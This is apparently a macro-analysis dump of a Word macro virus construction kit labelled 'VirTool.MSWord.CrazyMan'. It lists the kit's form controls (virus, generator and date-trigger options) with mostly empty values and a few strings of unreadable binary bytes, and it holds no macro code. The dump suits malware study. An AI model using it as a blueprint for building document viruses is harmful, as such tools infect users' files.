-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�íL��^#І�K��m�Ja����$nI���gT� !���ga�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Uq��J�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u����i$�I$�:1���Gru
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6@�:
��*�F�(��
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton41'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton47'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton46'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton40'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton39'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton45'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton44'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton38'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton37'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton43'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton42'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton36'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton48'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton32'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton10'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton9'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton8'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton7'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton6'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton5'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton4'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton3'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton13'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton14'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton15'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton16'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton17'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton18'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton19'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton20'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton30'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton29'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton28'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton27'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton26'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton25'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton24'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton23'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton22'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton12'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton11'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton21'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton31'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ButtonNO'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ButtonOK'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option2'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option3'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option4'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option5'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option6'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option7'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option8'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option9'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ButtonNO'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ButtonOK'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Text_HyperLink'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/i04'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ButtonNO'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ButtonOK'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_ganzesWort'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Text_Orginal'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Text_Replace'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame4'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandOK'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandNO'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_ZufallsGenerator'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_Datum'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_Datum'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_ZufallsGenerator'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandOK'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandNO'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Command_Test'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image_VbCritical'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image_VbQuestion'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image_VbExclamation'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image_VbInformation'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option_VbCritical'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option_VbQuestion'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option_VbExclamation'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_mitSymbol'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Option_VbInformation'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Text_Title'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'LabelInfo2'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LabelInfo1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Text_Prompt'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Command_DocNeu'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandOK'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandNO'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Command_DocOpen'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame3'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'List_Doc'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label_Ziel'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/i13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'MultiPage'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_Start'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_PGP'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm'
